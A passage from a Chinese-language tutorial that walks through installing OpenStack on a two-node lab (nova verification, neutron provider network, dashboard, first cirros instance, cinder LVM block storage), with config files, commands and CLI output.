'(vmx|svm)' /proc/cpuinfo 如果为0则需要修改#vi /etc/nova/nova.conf 123[libvirt]# ...virt_type = qemu 6.4启动服务12# systemctl enable libvirtd.service openstack-nova-compute.service# systemctl start libvirtd.service openstack-nova-compute.service 6.5验证(node2 主节点操作)将计算节点添加到单元数据库¶（在主节点操作） 12345678su -s /bin/sh -c \"nova-manage cell_v2 discover_hosts --verbose\" novaFound 2 cell mappings.Skipping cell0 since it does not contain hosts.Getting compute nodes from cell 'cell1': ad5a5985-a719-4567-98d8-8d148aaae4bcFound 1 computes in cell: ad5a5985-a719-4567-98d8-8d148aaae4bcChecking host mapping for compute host 'linux-node1': fe58ddc1-1d65-4f87-9456-bc040dc106b3Creating host mapping for compute host 'linux-node1': fe58ddc1-1d65-4f87-9456-bc040dc106b3 查看comput节点 1234567891011121314151617181920212223242526272829303132333435363738394041424344$ openstack compute service list+----+--------------------+------------+----------+---------+-------+----------------------------+| Id | Binary | Host | Zone | Status | State | Updated At |+----+--------------------+------------+----------+---------+-------+----------------------------+| 1 | nova-consoleauth | controller | internal | enabled | up | 2016-02-09T23:11:15.000000 || 2 | nova-scheduler | controller | internal | enabled | up | 2016-02-09T23:11:15.000000 || 3 | nova-conductor | controller | internal | enabled | up | 2016-02-09T23:11:16.000000 || 4 | nova-compute | compute1 | nova | enabled | up | 2016-02-09T23:11:20.000000 |+----+--------------------+------------+----------+---------+-------+----------------------------+查看catalog$ openstack catalog list+-----------+-----------+-----------------------------------------+| Name | Type | Endpoints |+-----------+-----------+-----------------------------------------+| keystone | identity | RegionOne || | | public: http://linux-node2:5000/v3/ || | | RegionOne || | | internal: http://linux-node2:5000/v3/ || | | RegionOne || | | admin: http://linux-node2:35357/v3/ || | | || glance | image | RegionOne || | | admin: http://linux-node2:9292 || | | RegionOne || | | public: http://linux-node2:9292 || | | RegionOne || | | internal: http://linux-node2:9292 || | | || nova | compute | RegionOne || | | admin: h http://linux-node2:8774/v2.1 || | | RegionOne || | | internal: http://linux-node2:8774/v2.1 || | | RegionOne || | | public: http://linux-node2:8774/v2.1 || | | || placement | placement | RegionOne || | | public: http://linux-node2:8778 || | | RegionOne || | | admin: http://linux-node2:8778 || | | RegionOne || | | internal: http://linux-node2:8778 || | | |+-----------+-----------+-----------------------------------------+ 列出Image服务中的图像以验证与Image服务的连接性： 1234567$ openstack image list+--------------------------------------+-------------+-------------+| ID | Name | Status |+--------------------------------------+-------------+-------------+| 9a76d9f9-9620-4f2e-8c69-6c5691fae163 | cirros | active |+--------------------------------------+-------------+-------------+ 检查单元格和放置API正在成功工作： 1234567891011121314151617# nova-status upgrade check+---------------------------+| Upgrade Check Results |+---------------------------+| Check: Cells v2 || Result: Success || Details: None |+---------------------------+| Check: Placement API || Result: Success || Details: None |+---------------------------+| Check: Resource Providers || Result: Success || Details: None |+---------------------------+ 七、网络节点一（node2 主控制节点操作）7.1 设置mysql123456$ mysql -u root –pMariaDB [（none）] CREATE DATABASE neutron;MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON neutron.* TO 'neutron'@'localhost' \\ IDENTIFIED BY 'neutron';MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON neutron.* TO 'neutron'@'%' \\ IDENTIFIED BY 'neutron'; 7.2**创建服务凭据**在admin的环境下 123456789101112131415$ . admin-openrc$ openstack user create --domain default --password-prompt neutronUser Password: neutron #密码Repeat User Password: neutron #密码+---------------------+----------------------------------+| Field | Value |+---------------------+----------------------------------+| domain_id | default || enabled | True || id | fdb0f541e28141719b6a43c8944bf1fb || name | neutron || options | &#123;&#125; || password_expires_at | None |+---------------------+----------------------------------+ 加入到admin组 1$ openstack role add --project service --user neutron admin 创建neutron 服务实体 12$ openstack service create --name neutron \\ --description \"OpenStack Networking\" network 创建neutron API 123456$ openstack endpoint create --region RegionOne \\ network public http://linux-node2:9696$ openstack endpoint create --region RegionOne \\ network internal http://linux-node2:9696$ openstack endpoint create --region RegionOne \\ network admin http://linux-node2:9696 7.3**配置网络选项**（这里我选用的是网络1 的配置）您可以使用选项1和2所代表的两种体系结构之一来部署网络服务。 选项1部署了最简单的架构，只支持将实例连接到提供者（外部）网络。没有自助服务（专用）网络， 路由器或浮动IP地址。只有admin或其他特权用户才能管理提供商网络。 选项2增加了选项1，其中第三层服务支持将实例附加到自助服务网络。这个demo或其他非特权用户可以管理自助服务网络， 包括在自助服务和提供商网络之间提供连接的路由器。此外，浮动IP地址还提供与使用来自外部网络（如Internet）的自助服务网络的实例的连接。 自助服务网络通常使用覆盖网络。覆盖网络协议（如VXLAN）包含额外的标头，这些标头会增加开销并减少有效负载或用户数据的可用空间。 在不了解虚拟网络基础架构的情况下，实例将尝试使用1500字节的默认以太网最大传输单元（MTU）发送数据包。 网络服务通过DHCP自动为实例提供正确的MTU值。但是，某些云图像不使用DHCP或忽略DHCP MTU选项并需要使用元数据或脚本进行配置。 7.4 安装网络openstack-neutron12# yum install openstack-neutron openstack-neutron-ml2 \\ openstack-neutron-linuxbridge ebtables 7.5 编辑/etc/neutron/neutron.conf1234567891011121314151617181920212223242526272829303132333435[database]# ...connection = mysql://neutron:neutron@linux-node2/neutron[DEFAULT]# ...core_plugin = ml2service_plugins =transport_url = rabbit://openstack:openstack@linux-node2auth_strategy = keystonenotify_nova_on_port_status_changes = truenotify_nova_on_port_data_changes = true[keystone_authtoken]# ...auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = neutronpassword = neutron ######这个密码是上面设置的密码[nova]# ...auth_url = http://linux-node2:35357auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultregion_name = RegionOneproject_name = serviceusername = novapassword = nova ####注意这个是nova设置的密码[oslo_concurrency]# ...lock_path = /var/lib/neutron/tmp 7.6**配置模块化层2（ML2）插件（/etc/neutron/plugins/ml2/ml2_conf.ini**）编辑配置文件设置如下： 12345678[ml2]type_drivers = flat,vlantenant_network_types =mechanism_drivers = linuxbridge[ml2_type_flat]flat_networks = provider[securitygroup]enable_ipset = true 7.7**配置Linux网桥代理（/etc/neutron/plugins/ml2/linuxbridge_agent.ini**）编辑配置文件设置如下： 12345678[linux_bridge]physical_interface_mappings = provider:eth1 ####这个是为底层实现网络的网络接口（我这里用了eth1）[vxlan]enable_vxlan = false[securitygroup]# ...enable_security_group = truefirewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver 7.8**配置DHCP代理（/etc/neutron/dhcp_agent.ini**）12345[DEFAULT] ＃... interface_driver = linuxbridge dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq enable_isolated_metadata = true 7.9**配置计算服务以使用网络服务（/etc/nova/nova.conf**）在该[neutron]部分中，配置访问参数，启用元数据代理并配置密钥： 12345678910111213[neutron] ＃... url = http：//linux-node2：9696 auth_url = http：//linux-node2：35357 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = neutron ###在身份识别服务中为用户选择的密码。service_metadata_proxy = true metadata_proxy_shared_secret = neutron # #为元数据代理选择的密码。 创建扩展链接 1# ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini 7.10同步数据库12# su -s /bin/sh -c \"neutron-db-manage --config-file /etc/neutron/neutron.conf \\ --config-file /etc/neutron/plugins/ml2/ml2_conf.ini upgrade head\" neutron 7.10 启动服务重新启动计算API服务： 12重新启动计算API服务：# systemctl restart openstack-nova-api.service 启动网络服务并将其配置为在系统引导时启动。 123456# systemctl enable neutron-server.service \\ neutron-linuxbridge-agent.service neutron-dhcp-agent.service \\ neutron-metadata-agent.service# systemctl start neutron-server.service \\ neutron-linuxbridge-agent.service neutron-dhcp-agent.service \\ neutron-metadata-agent.service 八、网络节点二、（node1 计算节点操作）8.1 安装openstack-neutron1# yum install openstack-neutron-linuxbridge ebtables ipset 8.2**配置通用组件（/etc/neutron/neutron.conf**）修改如下配置文件： 1234567891011121314151617[DEFAULT]transport_url = rabbit://openstack:openstack@linux-node2auth_strategy = keystone[keystone_authtoken]# ...auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers =linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = neutronpassword = neutron[oslo_concurrency]# ...lock_path = /var/lib/neutron/tmp 8.3**配置计算服务以使用网络服务（/etc/nova/nova.conf**）在该[neutron]部分中，配置访问参数： 1234567891011[neutron] ＃... url = http：//linux-node2：9696 auth_url = http：//linux-node2：35357 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = neutron 8.4**配置Linux网桥代理（/etc/neutron/plugins/ml2/linuxbridge_agent.ini**）编辑文件修改如下配置： 12345678[linux_bridge]physical_interface_mappings = provider:eht1 #这里是为底层服务的网卡名称[vxlan]enable_vxlan = false[securitygroup]# ...enable_security_group = truefirewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver 8.5 启动服务重启一下openstack-nova-compute 1# systemctl restart openstack-nova-compute.service 启动Linux桥代理并将其配置为在系统引导时启动： 12# systemctl enable neutron-linuxbridge-agent.service# systemctl start neutron-linuxbridge-agent.service 8.6 验证操作1.运行管理员环境 1$ . admin-openrc 2.查看网络 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889$ openstack extension list --network+---------------------------+---------------------------+----------------------------+| Name | Alias | Description |+---------------------------+---------------------------+----------------------------+| Default Subnetpools | default-subnetpools | Provides ability to mark || | | and use a subnetpool as || | | the default || Availability Zone | availability_zone | The availability zone || | | extension. || Network Availability Zone | network_availability_zone | Availability zone support || | | for network. || Port Binding | binding | Expose port bindings of a || | | virtual port to external || | | application || agent | agent | The agent management || | | extension. || Subnet Allocation | subnet_allocation | Enables allocation of || | | subnets from a subnet pool || DHCP Agent Scheduler | dhcp_agent_scheduler | Schedule networks among || | | dhcp agents || Tag support | tag | Enables to set tag on || | | resources. || Neutron external network | external-net | Adds external network || | | attribute to network || | | resource. || Neutron Service Flavors | flavors | Flavor specification for || | | Neutron advanced services || Network MTU | net-mtu | Provides MTU attribute for || | | a network resource. || Network IP Availability | network-ip-availability | Provides IP availability || | | data for each network and || | | subnet. || Quota management support | quotas | Expose functions for || | | quotas management per || | | tenant || Provider Network | provider | Expose mapping of virtual || | | networks to physical || | | networks || Multi Provider Network | multi-provider | Expose mapping of virtual || | | networks to multiple || | | physical networks || Address scope | address-scope | Address scopes extension. || Subnet service types | subnet-service-types | Provides ability to set || | | the subnet service_types || | | field || Resource timestamps | standard-attr-timestamp | Adds created_at and || | | updated_at fields to all || | | Neutron resources that || | | have Neutron standard || | | attributes. || Neutron Service Type | service-type | API for retrieving service || Management | | providers for Neutron || | | advanced services || Tag support for | tag-ext | Extends tag support to || resources: subnet, | | more L2 and L3 resources. || subnetpool, port, router | | || Neutron Extra DHCP opts | extra_dhcp_opt | Extra options || | | configuration for DHCP. || | | For example PXE boot || | | options to DHCP clients || | | can be specified (e.g. || | | tftp-server, server-ip- || | | address, bootfile-name) || Resource revision numbers | standard-attr-revisions | This extension will || | | display the revision || | | number of neutron || | | resources. || Pagination support | pagination | Extension that indicates || | | that pagination is || | | enabled. || Sorting support | sorting | Extension that indicates || | | that sorting is enabled. || security-group | security-group | The security groups || | | extension. || RBAC Policies | rbac-policies | Allows creation and || | | modification of policies || | | that control tenant access || | | to resources. || standard-attr-description | standard-attr-description | Extension to add || | | descriptions to standard || | | attributes || Port Security | port-security | Provides port security || Allowed Address Pairs | allowed-address-pairs | Provides allowed address || | | pairs || project_id field enabled | project-id | Extension that indicates || | | that project_id field is || | | enabled. |+---------------------------+---------------------------+----------------------------+ \\1. 查看网络 123456789103.$ openstack network agent list4.5.+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+6.| ID | Agent Type | Host | Availability Zone | Alive | State | Binary |7.+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+8.| 0400c2f6-4d3b-44bc-89fa-99093432f3bf | Metadata agent | controller | None | True | UP | neutron-metadata-agent |9.| 83cf853d-a2f2-450a-99d7-e9c6fc08f4c3 | DHCP agent | controller | nova | True | UP | neutron-dhcp-agent |10.| ec302e51-6101-43cf-9f19-88a78613cbee | Linux bridge agent | compute | None | True | UP | neutron-linuxbridge-agent |11.| fcb9bc6e-22b1-43bc-9054-272dd517d025 | Linux bridge agent | controller | None | True | UP | neutron-linuxbridge-agent |12.+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+ 九、**Dashboard**（node2控制节点操作）9.1 安装1# yum install openstack-dashboard 9.2配置主配置文件（**/etc/openstack-dashboard/local_settings**）12345678910111213141516171819202122232425262728293031323334OPENSTACK_HOST = \"linux-node2\"ALLOWED_HOSTS = ['*']SESSION_ENGINE = 'django.contrib.sessions.backends.cache'CACHES = &#123; 'default': &#123; 'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache', 'LOCATION': 'controller:11211', &#125;&#125;OPENSTACK_KEYSTONE_URL = \"http://%s:5000/v3\" % OPENSTACK_HOSTOPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = TrueOPENSTACK_API_VERSIONS = &#123; \"identity\": 3, \"image\": 2, \"volume\": 2,&#125;OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = \"Default\"OPENSTACK_KEYSTONE_DEFAULT_ROLE = \"user\"OPENSTACK_NEUTRON_NETWORK = &#123; ... 'enable_router': False, 'enable_quotas': False, 'enable_distributed_router': False, 'enable_ha_router': False, 'enable_lb': False, 'enable_firewall': False, 'enable_vpn': False, 'enable_fip_topology_check': False,&#125;TIME_ZONE = \"Asia/Shanghai \" 9.4重启服务1# systemctl restart httpd.service memcached.service 9.5 访问openstackhttp://192.168.57.145/dashboard/auth/login/ 十、启动第一个实例10.1 创建第一个实例首先是我选用的网络类型是提供商网络（） 创建一个环境 123456openstack flavor create --id 0 --vcpus 1 --ram 1024 --disk 10 m1.nano##########ID表示为唯一识别的标志--ram 表示内存的大小--disk 10 代表存储空间为10GM1.nano 为名字 10.2**生成一个密钥对**12345678910$ . demo-openrc$ ssh-keygen -q -N \"\"$ openstack keypair create --public-key ~/.ssh/id_rsa.pub mykey+-------------+-------------------------------------------------+| Field | Value |+-------------+-------------------------------------------------+| fingerprint | ee:3d:2e:97:d4:e2:6a:54:6d:0d:ce:43:39:2c:ba:4d || name | mykey || user_id | 58126687cbcc4888bfa9ab73a2256f27 |+-------------+-------------------------------------------------+ 查看 1234567$ openstack keypair list+-------+-------------------------------------------------+| Name | Fingerprint |+-------+-------------------------------------------------+| mykey | ee:3d:2e:97:d4:e2:6a:54:6d:0d:ce:43:39:2c:ba:4d |+-------+-------------------------------------------------+ 10.3创建一个icmp1$ openstack security group rule create --proto icmp default 添加规则 1$ openstack security group rule create --proto tcp --dst-port 22 default 10.4创建网络123456$ . admin-openrc$ openstack network create --share --external \\ --provider-physical-network provider \\ --provider-network-type flat provider该--share选项允许所有项目使用虚拟网络。该--external选项将虚拟网络定义为外部。如果你想创建一个内部网络，你可以使用--internal。默认值是internal。 10.5创建子网1234$ openstack subnet create --network provider \\ --allocation-pool start=192.168.57.100,end=192.168.57.200 \\ --dns-nameserver 202.101.224.68 --gateway 192.168.57.2 \\ --subnet-range 192.168.57.0/24 provider 10.6创建虚拟机查看有那些配置选项 12345678910[root@linux-node2 ~]# openstack flavor list+----+------------+------+------+-----------+-------+-----------+| ID | Name | RAM | Disk | Ephemeral | VCPUs | Is Public |+----+------------+------+------+-----------+-------+-----------+| 0 | m1.nano | 1024 | 1 | 0 | 1 | True || 10 | liang.nano | 1024 | 5 | 0 | 1 | True || 2 | m.nano | 1024 | 10 | 0 | 10 | True || 3 | m2.nano | 1024 | 10 | 0 | 1 | True || 4 | m4.nano | 1024 | 10 | 0 | 1 | True |+----+------------+------+------+-----------+-------+-----------+ 查看可以用的镜像 12345678[root@linux-node2 ~]# openstack image list+--------------------------------------+--------------------+--------+| ID | Name | Status |+--------------------------------------+--------------------+--------+| 470802c8-3385-4e08-b069-ace2d3f8e914 | Centos7 | active || 984e73aa-1faf-40c6-88ee-5532ab7cf41f | cirros | active || 742c7273-56f2-43e2-8816-98f980fd97d7 | windows Server2003 | active |+--------------------------------------+--------------------+--------+ 查看可用网络 12345678910111213[root@linux-node2 ~]# openstack network list+--------------------------------------+----------+--------------------------------------+| ID | Name | Subnets |+--------------------------------------+----------+--------------------------------------+| 161a2f1e-5c2d-418a-91a3-7a1d9aa35200 | provider | 80695e60-cd51-4385-8af3-cd792f3a77ef |+--------------------------------------+----------+--------------------------------------+[root@linux-node2 ~]# openstack security group list+--------------------------------------+---------+-------------+----------------------------------+| ID | Name | Description | Project |+--------------------------------------+---------+-------------+----------------------------------+| 593ef5a3-b48b-483e-8753-aabd81afae8a | default | 缺省安全组 | 2534c30f191a40038947f238c534c20d || 73b40ecf-1bfb-49d1-9382-05e3a2d0f577 | liang | adasd | 497f3c89978641479a56bb6954b6da7d |+--------------------------------------+---------+-------------+----------------------------------+ 创建虚拟机 12345678910111213141516171819202122232425262728293031323334[root@linux-node2 ~]# openstack server create --flavor m1.nano --image cirros \\&gt; --nic net-id=3de76652-72aa-4638-9c31-7465055db1f3 --security-group default \\&gt; --key-name mykey provider-instance+-----------------------------+-----------------------------------------------+| Field | Value |+-----------------------------+-----------------------------------------------+| OS-DCF:diskConfig | MANUAL || OS-EXT-AZ:availability_zone | || OS-EXT-STS:power_state | NOSTATE || OS-EXT-STS:task_state | scheduling || OS-EXT-STS:vm_state | building || OS-SRV-USG:launched_at | None || OS-SRV-USG:terminated_at | None || accessIPv4 | || accessIPv6 | || addresses | || adminPass | LYFNpN5rHRnx || config_drive | || created | 2018-01-03T07:39:13Z || flavor | m1.nano (0) || hostId | || id | 00d4afc5-266f-4852-9c7f-b86c2a5ec3f3 || image | cirros (984e73aa-1faf-40c6-88ee-5532ab7cf41f) || key_name | mykey || name | provider-instance || progress | 0 || project_id | 497f3c89978641479a56bb6954b6da7d || properties | || security_groups | name='ff0181e2-596b-4e1b-87d9-90647674194b' || status | BUILD || updated | 2018-01-03T07:39:13Z || user_id | 1df20bd306664a498a6c9d6af66263a8 || volumes_attached | |+-----------------------------+-----------------------------------------------+ 查看虚拟机（状态从改变BUILD到ACTIVE时构建过程成功完成。） 1234567891011121314151617181920[root@linux-node2 ~]# openstack server list+--------------------------------------+-------------------+--------+----------+--------+---------+| ID | Name | Status | Networks | Image | Flavor |+--------------------------------------+-------------------+--------+----------+--------+---------+| 00d4afc5-266f-4852-9c7f-b86c2a5ec3f3 | provider-instance | BUILD | | cirros | m1.nano |+--------------------------------------+-------------------+--------+----------+--------+---------+[root@linux-node2 ~]# openstack server list+--------------------------------------+-------------------+--------+-------------------------+--------+---------+| ID | Name | Status | Networks | Image | Flavor |+--------------------------------------+-------------------+--------+-------------------------+--------+---------+| 00d4afc5-266f-4852-9c7f-b86c2a5ec3f3 | provider-instance | ACTIVE | provider=192.168.57.105 | cirros | m1.nano |+--------------------------------------+-------------------+--------+-------------------------+--------+---------+查看虚拟机的VNC的URL[root@linux-node2 ~]# openstack console url show provider-instance+-------+----------------------------------------------------------------------------------+| Field | Value |+-------+----------------------------------------------------------------------------------+| type | novnc || url | http://linux-node2:6080/vnc_auto.html?token=2d0363d8-dcc7-4048-a3e8-38ad0551bc18 |+-------+----------------------------------------------------------------------------------+ 10.7网页查看 10.8 测试网络连通性在openstack server list中查看的IP地址为192.168.57.105 现在在node1 node2 进行测试 Node2 测试结果 12345678910[root@linux-node2 ~]# ping -c 4 192.168.57.105PING 192.168.57.105 (192.168.57.105) 56(84) bytes of data.64 bytes from 192.168.57.105: icmp_seq=1 ttl=64 time=2.48 ms64 bytes from 192.168.57.105: icmp_seq=2 ttl=64 time=2.23 ms64 bytes from 192.168.57.105: icmp_seq=3 ttl=64 time=1.84 ms64 bytes from 192.168.57.105: icmp_seq=4 ttl=64 time=2.64 ms--- 192.168.57.105 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3005msrtt min/avg/max/mdev = 1.841/2.299/2.642/0.305 ms node1 测试结果 12345678910[root@linux-node1 neutron]# ping -c 4 192.168.57.105PING 192.168.57.105 (192.168.57.105) 56(84) bytes of data.64 bytes from 192.168.57.105: icmp_seq=1 ttl=64 time=1.33 ms64 bytes from 192.168.57.105: icmp_seq=2 ttl=64 time=0.873 ms64 bytes from 192.168.57.105: icmp_seq=3 ttl=64 time=1.22 ms64 bytes from 192.168.57.105: icmp_seq=4 ttl=64 time=2.47 ms--- 192.168.57.105 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3004msrtt min/avg/max/mdev = 0.873/1.478/2.476/0.602 ms 10.9 S**sh连接测试一下**12345678910111213141516171819202122232425[root@linux-node2 ~]# ssh cirros@192.168.57.105The authenticity of host '192.168.57.105 (192.168.57.105)' can't be established.RSA key fingerprint is SHA256:7Qa9JtqTy/3uqoJKw7doB6hC93pHEuHbv+e6xpgPGD8.RSA key fingerprint is MD5:61:64:aa:1a:94:f7:dc:26:58:f5:cf:fd:ba:48:66:b5.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '192.168.57.105' (RSA) to the list of known hosts.$ ifconfigeth0 Link encap:Ethernet HWaddr FA:16:3E:27:D7:37 inet addr:192.168.57.105 Bcast:192.168.57.255 Mask:255.255.255.0 inet6 addr: fe80::f816:3eff:fe27:d737/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:364 errors:0 dropped:0 overruns:0 frame:0 TX packets:249 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:33991 (33.1 KiB) TX bytes:26215 (25.6 KiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) 十一、块存储服务（控制节点node2 操作）11.1 数据库操作123456$ mysql -u root –pMariaDB [(none)]&gt; CREATE DATABASE cinder;MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON cinder.* TO 'cinder'@'localhost' \\ IDENTIFIED BY 'cinder';MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON cinder.* TO 'cinder'@'%' \\ IDENTIFIED BY 'cinder'; 11.2**创建服务凭据**1234567891011121314$ openstack user create --domain default --password-prompt cinderUser Password: cinder ###密码Repeat User Password: cinder +---------------------+----------------------------------+| Field | Value |+---------------------+----------------------------------+| domain_id | default || enabled | True || id | 9d7e33de3e1a498390353819bc7d245d || name | cinder || options | &#123;&#125; || password_expires_at | None |+---------------------+----------------------------------+ 添加到admin组 1$ openstack role add --project service --user cinder admin 11.3 创建cinderv2和cinderv3服务实体：123456789101112131415161718192021222324$ openstack service create --name cinderv2 \\ --description \"OpenStack Block Storage\" volumev2+-------------+----------------------------------+| Field | Value |+-------------+----------------------------------+| description | OpenStack Block Storage || enabled | True || id | eb9fd245bdbc414695952e93f29fe3ac || name | cinderv2 || type | volumev2 |+-------------+----------------------------------+$ openstack service create --name cinderv3 \\ --description \"OpenStack Block Storage\" volumev3+-------------+----------------------------------+| Field | Value |+-------------+----------------------------------+| description | OpenStack Block Storage || enabled | True || id | ab3bbbef780845a1a283490d281e7fda || name | cinderv3 || type | volumev3 |+-------------+----------------------------------+ 11.4建立快存储API1234567891011121314151617$ openstack endpoint create --region RegionOne \\ volumev2 public http://linux-node2:8776/v2/%\\(project_id\\)s$ openstack endpoint create --region RegionOne \\ volumev2 internal http://linux-node2:8776/v2/%\\(project_id\\)s$ openstack endpoint create --region RegionOne \\ volumev2 admin http://linux-node2:8776/v2/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\ volumev3 public http://linux-node2:8776/v3/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\ volumev3 internal http://linux-node2:8776/v3/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\ volumev3 admin http://linux-node2:8776/v3/%\\(project_id\\)s 11.5 安装cinder1# yum install openstack-cinder 11.6配置cinder（**/etc/cinder/cinder.conf**）12[database]connection = mysql://cinder:cinder @linux-node2/cinder default部分 123456789101112131415161718[DEFAULT] # ...transport_url = rabbit://openstack:openstack@linux-node2auth_strategy = keystonemy_ip = 192.168.57.145[keystone_authtoken]# ...auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = cinderpassword = cinder[oslo_concurrency]# ...lock_path = /var/lib/cinder/tmp 配置计算使用块存储¶ 编辑/etc/nova/nova.conf文件并添加以下内容： 12[cinder] os_region_name = RegionOne 11.7 填充数据库1# su -s /bin/sh -c \"cinder-manage db sync\" cinder 11.8**完成安装**重新启动计算API服务： 1# systemctl restart openstack-nova-api.service 启动块存储服务并将其配置为在系统引导时启动： 12# systemctl enable openstack-cinder-api.service openstack-cinder-scheduler.service# systemctl start openstack-cinder-api.service openstack-cinder-scheduler.service 十二、块存储服务（可以新开一台机器也可以使用计算节点，我这里使用的计算节点node1）首先添加一块硬盘50G吧。使用LVM的方式 12.1 安装lvm123# yum install lvm2# systemctl enable lvm2-lvmetad.service# systemctl start lvm2-lvmetad.service 12.2配置lvm创建LVM物理卷/dev/sdb 123# pvcreate /dev/sdbPhysical volume \"/dev/sdb\" successfully created 创建LVM卷组cinder-volumes： 123# vgcreate cinder-volumes /dev/sdbVolume group \"cinder-volumes\" successfully created 编辑 /etc/lvm/lvm.conf 123devices &#123;...filter = [ \"a/sdb/\", \"r/.*/\"] #################################其他方式 如果您的存储节点在操作系统磁盘上使用LVM，则还必须将关联的设备添加到过滤器。例如，如果/dev/sda设备包含操作系统： 1filter = [“a / sda /”，“a / sdb /”，“r /.*/”] 同样，如果计算节点在操作系统磁盘上使用LVM，则还必须修改/etc/lvm/lvm.conf这些节点上的文件中的筛选器， 使其只包含操作系统磁盘。例如，如果/dev/sda 设备包含操作系统： 1filter = [“a / sda /”，“r /.*/”] 12.3**安装和配置的部件**1yum install openstack-cinder targetcli python-keystone 12.4配置主配置文件（**/etc/cinder/cinder.conf**）123456789101112131415161718192021222324252627282930[DEFAULT]# ...transport_url = rabbit://openstack:openstack@linux-node2auth_strategy = keystonemy_ip = 192.168.57.142enabled_backends = lvmglance_api_servers = http://linux-node2:9292[database]# ...connection = mysql://cinder:cinder@linux-node2/cinder[keystone_authtoken]# ...auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = cinderpassword = cinder########【lvm】在最后面添加###############[lvm]volume_driver = cinder.volume.drivers.lvm.LVMVolumeDrivervolume_group = cinder-volumesiscsi_protocol = iscsiiscsi_helper = lioadm[oslo_concurrency]# ...lock_path = /var/lib/cinder/tmp 12.5 启动12# systemctl enable openstack-cinder-volume.service target.service# systemctl start openstack-cinder-volume.service target.service 12.6 检查 12345678[root@linux-node2 cinder]# admin-openrc[root@linux-node2 cinder]# openstack volume service list+------------------+-----------------+------+---------+-------+----------------------------+| Binary | Host | Zone | Status | State | Updated At |+------------------+-----------------+------+---------+-------+----------------------------+| cinder-scheduler | linux-node2 | nova | enabled | up | 2018-01-02T16:11:10.000000 || cinder-volume | linux-node1@lvm | nova | enabled | up | 2018-01-02T16:11:05.000000 |+------------------+-----------------+------+---------+-------+----------------------------+ 12.7 创建块存储创建一个10G的存储 12345678910111213141516171819202122232425[root@linux-node2 cinder]# openstack volume create --size 10 volume1+---------------------+--------------------------------------+| Field | Value |+---------------------+--------------------------------------+| attachments | [] || availability_zone | nova || bootable | false || consistencygroup_id | None || created_at | 2018-01-02T15:46:13.269273 || description | None || encrypted | False || id | d1b2e03b-c80a-4cde-ad25-65abab621b0c || migration_status | None || multiattach | False || name | volume1 || properties | || replication_status | None || size | 10 || snapshot_id | None || source_volid | None || status | creating || type | None || updated_at | None || user_id | 40a299a16064488facc16764cb635c12 |+---------------------+--------------------------------------+ 查看 123456[root@linux-node2 cinder]# openstack volume list+--------------------------------------+---------+-----------+------+-------------+| ID | Name | Status | Size | Attached to |+--------------------------------------+---------+-----------+------+-------------+| d1b2e03b-c80a-4cde-ad25-65abab621b0c | volume1 | available | 10 | |+--------------------------------------+---------+-----------+------+-------------+ 12.7**将卷附加到实例**1[root@linux-node2 cinder]# openstack server add volume provider-instance volume1 查看 1234567[root@linux-node2 cinder]# openstack volume list+--------------------------------------+---------+--------+------+--------------------------------------------+| ID | Name | Status | Size | Attached to |+--------------------------------------+---------+--------+------+--------------------------------------------+| d1b2e03b-c80a-4cde-ad25-65abab621b0c | volume1 | in-use | 10 | Attached to provider-instance on /dev/vdb |+--------------------------------------+---------+--------+------+--------------------------------------------+[root@linux-node2 cinder]# 十三、安装虚拟机这里我是自己上传了一个Centos7 的镜像。像上面创建实例一样创建的。后面把硬盘添加到这个实例里面。后面启动。就有了下面的画面 已经显示有10G硬盘了。现在可以安装系统了。我笔记本配置比较渣渣。弄起来太慢了 用VNC连接node1 的KVM就可以操作了。网页不好操作 Node1 中有一个5901的进程。我们用VNC的客户端连接一下就够了 